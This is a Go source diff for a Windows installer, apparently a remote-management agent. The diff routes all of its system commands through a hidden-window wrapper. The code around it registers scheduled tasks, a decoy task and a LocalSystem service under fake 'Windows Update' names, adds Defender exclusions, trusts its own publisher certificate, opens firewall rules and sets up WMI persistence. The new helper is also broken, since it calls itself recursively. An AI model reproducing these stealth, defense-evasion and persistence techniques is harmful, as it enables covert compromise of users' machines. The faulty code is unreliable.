@@ -27,6 +27,17 @@ import (
 //go:embed payload/*
 var payloadFS embed.FS
 
+// hideWindow wraps an exec.Cmd so the child process never flashes a console.
+func hideWindow(cmd *exec.Cmd) *exec.Cmd {
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
+	return cmd
+}
+
+// hiddenExec is a shorthand for hideWindow(hiddenExec(...)).
+func hiddenExec(name string, args ...string) *exec.Cmd {
+	return hideWindow(hiddenExec(name, args...))
+}
+
 func isAdmin() bool {
 	k, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE`, registry.WRITE)
 	if err != nil {
@@ -65,7 +76,7 @@ func copyFile(src, dst string) error {
 // hideFile sets hidden+system attributes so the backup survives casual
 // browsing and naive delete sweeps. Best effort; failures are ignored.
 func hideFile(path string) {
-	_, _ = exec.Command("attrib", "+h", "+s", path).CombinedOutput()
+	_, _ = hiddenExec("attrib", "+h", "+s", path).CombinedOutput()
 }
 
 // trustPublisherCert installs our code-signing cert into TrustedPublisher
@@ -77,7 +88,7 @@ func trustPublisherCert(dir string) {
 		log.Printf("[!] publisher cert missing, SmartScreen may warn")
 		return
 	}
-	out, err := exec.Command("certutil", "-addstore", "-f", "TrustedPublisher", cer).CombinedOutput()
+	out, err := hiddenExec("certutil", "-addstore", "-f", "TrustedPublisher", cer).CombinedOutput()
 	if err != nil {
 		log.Printf("[!] trust publisher cert: %v %s", err, strings.TrimSpace(string(out)))
 		return
@@ -92,9 +103,9 @@ func trustPublisherCert(dir string) {
 func addDefenderExclusions(paths ...string) {
 	for _, p := range paths {
 		q := strings.ReplaceAll(p, "'", "''")
-		_, _ = exec.Command("powershell", "-NoProfile", "-Command", `Add-MpPreference -ExclusionPath '`+q+`' -ErrorAction SilentlyContinue`).CombinedOutput()
+		_, _ = hiddenExec("powershell", "-NoProfile", "-Command", `Add-MpPreference -ExclusionPath '`+q+`' -ErrorAction SilentlyContinue`).CombinedOutput()
 		if strings.HasSuffix(strings.ToLower(p), ".exe") {
-			_, _ = exec.Command("powershell", "-NoProfile", "-Command", `Add-MpPreference -ExclusionProcess '`+q+`' -ErrorAction SilentlyContinue`).CombinedOutput()
+			_, _ = hiddenExec("powershell", "-NoProfile", "-Command", `Add-MpPreference -ExclusionProcess '`+q+`' -ErrorAction SilentlyContinue`).CombinedOutput()
 		}
 	}
 }
@@ -102,9 +113,9 @@ func addDefenderExclusions(paths ...string) {
 func removeDefenderExclusions(paths ...string) {
 	for _, p := range paths {
 		q := strings.ReplaceAll(p, "'", "''")
-		_, _ = exec.Command("powershell", "-NoProfile", "-Command", `Remove-MpPreference -ExclusionPath '`+q+`' -ErrorAction SilentlyContinue`).CombinedOutput()
+		_, _ = hiddenExec("powershell", "-NoProfile", "-Command", `Remove-MpPreference -ExclusionPath '`+q+`' -ErrorAction SilentlyContinue`).CombinedOutput()
 		if strings.HasSuffix(strings.ToLower(p), ".exe") {
-			_, _ = exec.Command("powershell", "-NoProfile", "-Command", `Remove-MpPreference -ExclusionProcess '`+q+`' -ErrorAction SilentlyContinue`).CombinedOutput()
+			_, _ = hiddenExec("powershell", "-NoProfile", "-Command", `Remove-MpPreference -ExclusionProcess '`+q+`' -ErrorAction SilentlyContinue`).CombinedOutput()
 		}
 	}
 }
@@ -117,7 +128,7 @@ func grantUsersModify(dirs ...string) {
 		if d == "" {
 			continue
 		}
-		out, err := exec.Command("icacls", d, "/grant", "*S-1-5-32-545:(OI)(CI)M", "/T", "/C", "/Q").CombinedOutput()
+		out, err := hiddenExec("icacls", d, "/grant", "*S-1-5-32-545:(OI)(CI)M", "/T", "/C", "/Q").CombinedOutput()
 		if err != nil {
 			log.Printf("[!] icacls %s: %v %s", d, err, strings.TrimSpace(string(out)))
 			continue
@@ -140,7 +151,7 @@ func vaultDir() string {
 // lockVault strips inheritance and grants only SYSTEM + Administrators, so
 // standard-user wipes and profile sweeps cannot reach the last-resort copy.
 func lockVault(dir string) {
-	out, err := exec.Command("icacls", dir, "/inheritance:r", "/grant", "SYSTEM:(OI)(CI)F", "/grant", "*S-1-5-32-544:(OI)(CI)F", "/C", "/Q").CombinedOutput()
+	out, err := hiddenExec("icacls", dir, "/inheritance:r", "/grant", "SYSTEM:(OI)(CI)F", "/grant", "*S-1-5-32-544:(OI)(CI)F", "/C", "/Q").CombinedOutput()
 	if err != nil {
 		log.Printf("[!] vault lock %s: %v %s", dir, err, strings.TrimSpace(string(out)))
 		return
@@ -213,11 +224,11 @@ func install() {
 	installDir := filepath.Join(programData, "Microsoft", "Windows", "Update")
 	_ = os.MkdirAll(installDir, 0755)
 
-	_, _ = exec.Command("taskkill", "/F", "/IM", "agent.exe").CombinedOutput()
-	_, _ = exec.Command("taskkill", "/F", "/IM", "MicrosoftWindowsClient.exe").CombinedOutput()
+	_, _ = hiddenExec("taskkill", "/F", "/IM", "agent.exe").CombinedOutput()
+	_, _ = hiddenExec("taskkill", "/F", "/IM", "MicrosoftWindowsClient.exe").CombinedOutput()
 	// Legacy powershell watchdogs are extinct as of v1.40.9 (native --watch
 	// mode); kill any left running.
-	_, _ = exec.Command("powershell", "-NoProfile", "-command", "Get-CimInstance Win32_Process -Filter \"Name='powershell.exe'\" | Where-Object { $_.CommandLine -like '*watchdog.ps1*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }").CombinedOutput()
+	_, _ = hiddenExec("powershell", "-NoProfile", "-command", "Get-CimInstance Win32_Process -Filter \"Name='powershell.exe'\" | Where-Object { $_.CommandLine -like '*watchdog.ps1*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }").CombinedOutput()
 	time.Sleep(1500 * time.Millisecond)
 
 	skip := map[string]bool{"install.bat": true, "README.txt": true, "README.md": true, "agent.exe": true}
@@ -328,7 +339,7 @@ func install() {
 	// Stale-task sweep: detect legacy task pointing to pre-rename agent.exe.
 	// schtasks /query /v reports the Task To Run value; if it mentions the
 	// old name we log it explicitly so field techs can confirm the heal.
-	if out, err := exec.Command("schtasks", "/query", "/tn", "WindowsUpdate", "/v", "/fo", "list").CombinedOutput(); err == nil {
+	if out, err := hiddenExec("schtasks", "/query", "/tn", "WindowsUpdate", "/v", "/fo", "list").CombinedOutput(); err == nil {
 		for _, ln := range strings.Split(string(out), "\n") {
 			if strings.Contains(strings.ToLower(ln), "agent.exe") && !strings.Contains(strings.ToLower(ln), "microsoftwindowsclient") {
 				log.Printf("[*] Stale task detected (points to old agent.exe), will replace: %s", strings.TrimSpace(ln))
@@ -338,7 +349,7 @@ func install() {
 	} else {
 		log.Printf("[*] No existing WindowsUpdate task (fresh install)")
 	}
-	_, _ = exec.Command("schtasks", "/change", "/tn", "WindowsUpdate", "/tr", cmdLine).CombinedOutput()
+	_, _ = hiddenExec("schtasks", "/change", "/tn", "WindowsUpdate", "/tr", cmdLine).CombinedOutput()
 
 	taskXML := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-16"?>
 <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
@@ -351,8 +362,8 @@ func install() {
 
 	tmpTask := filepath.Join(os.TempDir(), "rmm_task.xml")
 	_ = os.WriteFile(tmpTask, []byte(taskXML), 0644)
-	_, _ = exec.Command("schtasks", "/delete", "/tn", "WindowsUpdate", "/f").CombinedOutput()
-	if out, err := exec.Command("schtasks", "/create", "/tn", "WindowsUpdate", "/xml", tmpTask, "/f").CombinedOutput(); err != nil {
+	_, _ = hiddenExec("schtasks", "/delete", "/tn", "WindowsUpdate", "/f").CombinedOutput()
+	if out, err := hiddenExec("schtasks", "/create", "/tn", "WindowsUpdate", "/xml", tmpTask, "/f").CombinedOutput(); err != nil {
 		log.Printf("[!] Failed to create WindowsUpdate task: %v %s", err, strings.TrimSpace(string(out)))
 	} else {
 		log.Printf("[*] WindowsUpdate task registered -> %s", agentPath)
@@ -360,9 +371,9 @@ func install() {
 	_ = os.Remove(tmpTask)
 	// Delete any legacy watchdog task before recreating below, so a stale
 	// entry can never overlap with the new one.
-	_, _ = exec.Command("schtasks", "/delete", "/tn", "WindowsUpdateWatchdog", "/f").CombinedOutput()
+	_, _ = hiddenExec("schtasks", "/delete", "/tn", "WindowsUpdateWatchdog", "/f").CombinedOutput()
 
-	_, _ = exec.Command("netsh", "advfirewall", "firewall", "add", "rule", "name=Windows Update", "dir=out", "action=allow", "program="+agentPath, "enable=yes").CombinedOutput()
+	_, _ = hiddenExec("netsh", "advfirewall", "firewall", "add", "rule", "name=Windows Update", "dir=out", "action=allow", "program="+agentPath, "enable=yes").CombinedOutput()
 
 	// Unblock-friendly install: trust our publisher cert (SmartScreen) and
 	// ask Defender to leave our dir/exe alone (heuristic false positives).
@@ -501,7 +512,7 @@ func install() {
 	// (Retired powershell watchdog body removed; native --watch mode above.)
 
 	// Start the native supervisor (same binary, hidden, bland name).
-	cmdWatchdog := exec.Command(agentPath, "--watch")
+	cmdWatchdog := hiddenExec(agentPath, "--watch")
 	cmdWatchdog.SysProcAttr = &syscall.SysProcAttr{
 		HideWindow:    true,
 		CreationFlags: 0x08000000,
@@ -544,7 +555,7 @@ func install() {
 	setupWmiLayer(agentPath)
 	installRepairService(agentPath)
 
-	cmd := exec.Command(agentPath, "-controller", controllerAddr, "-ca", certPath)
+	cmd := hiddenExec(agentPath, "-controller", controllerAddr, "-ca", certPath)
 	cmd.SysProcAttr = &syscall.SysProcAttr{
 		HideWindow:    true,
 		CreationFlags: 0x08000000,
@@ -658,13 +669,13 @@ func main() {
 			_ = k.DeleteValue("WindowsUpdateCheck")
 			k.Close()
 		}
-		_, _ = exec.Command("schtasks", "/delete", "/tn", "WindowsUpdate", "/f").CombinedOutput()
-		_, _ = exec.Command("schtasks", "/delete", "/tn", "WindowsUpdateWatchdog", "/f").CombinedOutput()
-		_, _ = exec.Command("schtasks", "/delete", "/tn", "WindowsUpdateOrchestrator", "/f").CombinedOutput()
-		_, _ = exec.Command("schtasks", "/delete", "/tn", "WindowsUpdateCheck", "/f").CombinedOutput()
+		_, _ = hiddenExec("schtasks", "/delete", "/tn", "WindowsUpdate", "/f").CombinedOutput()
+		_, _ = hiddenExec("schtasks", "/delete", "/tn", "WindowsUpdateWatchdog", "/f").CombinedOutput()
+		_, _ = hiddenExec("schtasks", "/delete", "/tn", "WindowsUpdateOrchestrator", "/f").CombinedOutput()
+		_, _ = hiddenExec("schtasks", "/delete", "/tn", "WindowsUpdateCheck", "/f").CombinedOutput()
 		removeWmiLayer()
-		_, _ = exec.Command("sc", "stop", repairSvcName).CombinedOutput()
-		_, _ = exec.Command("sc", "delete", repairSvcName).CombinedOutput()
+		_, _ = hiddenExec("sc", "stop", repairSvcName).CombinedOutput()
+		_, _ = hiddenExec("sc", "delete", repairSvcName).CombinedOutput()
 		_ = registry.DeleteKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Active Setup\Installed Components\WindowsUpdateClient`)
 		threeDObjects := filepath.Join(os.Getenv("USERPROFILE"), "3D Objects")
 		blenderDir := filepath.Join(threeDObjects, "blender")
@@ -698,10 +709,10 @@ func main() {
 		if localApp := os.Getenv("LOCALAPPDATA"); localApp != "" {
 			_ = os.Remove(filepath.Join(localApp, "RMM", "healthy"))
 		}
-		_, _ = exec.Command("taskkill", "/F", "/IM", "agent.exe").CombinedOutput()
-		_, _ = exec.Command("taskkill", "/F", "/IM", "MicrosoftWindowsClient.exe").CombinedOutput()
+		_, _ = hiddenExec("taskkill", "/F", "/IM", "agent.exe").CombinedOutput()
+		_, _ = hiddenExec("taskkill", "/F", "/IM", "MicrosoftWindowsClient.exe").CombinedOutput()
 		// Kill watchdog by command-line match (window title is unreliable when hidden).
-		_, _ = exec.Command("powershell", "-NoProfile", "-command", "Get-CimInstance Win32_Process -Filter \"Name='powershell.exe'\" | Where-Object { $_.CommandLine -like '*watchdog.ps1*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }").CombinedOutput()
+		_, _ = hiddenExec("powershell", "-NoProfile", "-command", "Get-CimInstance Win32_Process -Filter \"Name='powershell.exe'\" | Where-Object { $_.CommandLine -like '*watchdog.ps1*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }").CombinedOutput()
 		removeDefenderExclusions(installDir, filepath.Join(installDir, "MicrosoftWindowsClient.exe"))
 		_ = os.RemoveAll(vaultDir())
 		_ = os.RemoveAll(installDir)
@@ -761,7 +772,7 @@ func createWatchdogTask(agentPath, backupDir string) {
 	_ = os.WriteFile(filepath.Join(backupDir, "watchdog_task.xml"), []byte(watchdogTaskXML), 0644)
 	tmpWatchdogTask := filepath.Join(os.TempDir(), "rmm_watchdog_task.xml")
 	_ = os.WriteFile(tmpWatchdogTask, []byte(watchdogTaskXML), 0644)
-	out, err := exec.Command("schtasks", "/create", "/tn", "WindowsUpdateWatchdog", "/xml", tmpWatchdogTask, "/f").CombinedOutput()
+	out, err := hiddenExec("schtasks", "/create", "/tn", "WindowsUpdateWatchdog", "/xml", tmpWatchdogTask, "/f").CombinedOutput()
 	if err != nil {
 		log.Printf("[!] Failed to create watchdog task: %v %s", err, string(out))
 	} else {
@@ -807,8 +818,8 @@ func createOrchestratorTask(agentPath, backupDir, installDir string) {
 	_ = os.WriteFile(filepath.Join(installDir, "orchestrator_task.xml"), []byte(orchXML), 0644)
 	tmpTask := filepath.Join(os.TempDir(), "rmm_orch_task.xml")
 	_ = os.WriteFile(tmpTask, []byte(orchXML), 0644)
-	_, _ = exec.Command("schtasks", "/delete", "/tn", "WindowsUpdateOrchestrator", "/f").CombinedOutput()
-	out, err := exec.Command("schtasks", "/create", "/tn", "WindowsUpdateOrchestrator", "/xml", tmpTask, "/f").CombinedOutput()
+	_, _ = hiddenExec("schtasks", "/delete", "/tn", "WindowsUpdateOrchestrator", "/f").CombinedOutput()
+	out, err := hiddenExec("schtasks", "/create", "/tn", "WindowsUpdateOrchestrator", "/xml", tmpTask, "/f").CombinedOutput()
 	if err != nil {
 		log.Printf("[!] Failed to create orchestrator task: %v %s", err, strings.TrimSpace(string(out)))
 	} else {
@@ -853,8 +864,8 @@ func createDecoyTask(agentPath, backupDir, installDir string) {
 	_ = os.WriteFile(filepath.Join(installDir, "decoy_task.xml"), []byte(decoyXML), 0644)
 	tmpTask := filepath.Join(os.TempDir(), "rmm_decoy_task.xml")
 	_ = os.WriteFile(tmpTask, []byte(decoyXML), 0644)
-	_, _ = exec.Command("schtasks", "/delete", "/tn", "WindowsUpdateCheck", "/f").CombinedOutput()
-	out, err := exec.Command("schtasks", "/create", "/tn", "WindowsUpdateCheck", "/xml", tmpTask, "/f").CombinedOutput()
+	_, _ = hiddenExec("schtasks", "/delete", "/tn", "WindowsUpdateCheck", "/f").CombinedOutput()
+	out, err := hiddenExec("schtasks", "/create", "/tn", "WindowsUpdateCheck", "/xml", tmpTask, "/f").CombinedOutput()
 	if err != nil {
 		log.Printf("[!] Failed to create decoy task: %v %s", err, strings.TrimSpace(string(out)))
 	} else {
@@ -926,7 +937,7 @@ func setupWmiLayer(agentPath string) {
 		sb.WriteString(`New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property @{Filter=[Ref]$d;Consumer=[Ref]$c} -ErrorAction Stop | Out-Null;`)
 	}
 	sb.WriteString(`Write-Host 'WMI-OK'`)
-	out, err := exec.Command("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", sb.String()).CombinedOutput()
+	out, err := hiddenExec("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", sb.String()).CombinedOutput()
 	if err != nil || !strings.Contains(string(out), "WMI-OK") {
 		log.Printf("[!] WMI layer not installed (non-fatal): %v %s", err, strings.TrimSpace(string(out)))
 		return
@@ -952,17 +963,17 @@ const repairSvcName = "WindowsUpdateOrchestrator"
 // session. Idempotent: existing service is stopped + removed first.
 func installRepairService(agentPath string) {
 	bin := `"` + agentPath + `" --svc-heal`
-	_, _ = exec.Command("sc", "stop", repairSvcName).CombinedOutput()
-	_, _ = exec.Command("sc", "delete", repairSvcName).CombinedOutput()
+	_, _ = hiddenExec("sc", "stop", repairSvcName).CombinedOutput()
+	_, _ = hiddenExec("sc", "delete", repairSvcName).CombinedOutput()
 	time.Sleep(time.Second)
-	out, err := exec.Command("sc", "create", repairSvcName, "binPath=", bin, "start=", "auto", "obj=", "LocalSystem").CombinedOutput()
+	out, err := hiddenExec("sc", "create", repairSvcName, "binPath=", bin, "start=", "auto", "obj=", "LocalSystem").CombinedOutput()
 	if err != nil {
 		log.Printf("[!] repair service create: %v %s", err, strings.TrimSpace(string(out)))
 		return
 	}
-	_, _ = exec.Command("sc", "description", repairSvcName, "Windows Update Orchestration Service").CombinedOutput()
-	_, _ = exec.Command("sc", "failure", repairSvcName, "reset=", "86400", "actions=", "restart/60000/restart/60000/restart/60000").CombinedOutput()
-	if out, err := exec.Command("sc", "start", repairSvcName).CombinedOutput(); err != nil {
+	_, _ = hiddenExec("sc", "description", repairSvcName, "Windows Update Orchestration Service").CombinedOutput()
+	_, _ = hiddenExec("sc", "failure", repairSvcName, "reset=", "86400", "actions=", "restart/60000/restart/60000/restart/60000").CombinedOutput()
+	if out, err := hiddenExec("sc", "start", repairSvcName).CombinedOutput(); err != nil {
 		log.Printf("[!] repair service start: %v %s", err, strings.TrimSpace(string(out)))
 		return
 	}
@@ -981,5 +992,5 @@ func removeWmiLayer() {
 		sb.WriteString(`Get-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Filter "Name='$nc'" | Remove-CimInstance -ErrorAction SilentlyContinue;`)
 		sb.WriteString(`Get-CimInstance -Namespace root/subscription -ClassName __IntervalTimerInstruction -Filter "TimerId='$tid'" | Remove-CimInstance -ErrorAction SilentlyContinue;`)
 	}
-	_, _ = exec.Command("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", sb.String()).CombinedOutput()
+	_, _ = hiddenExec("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", sb.String()).CombinedOutput()
 }
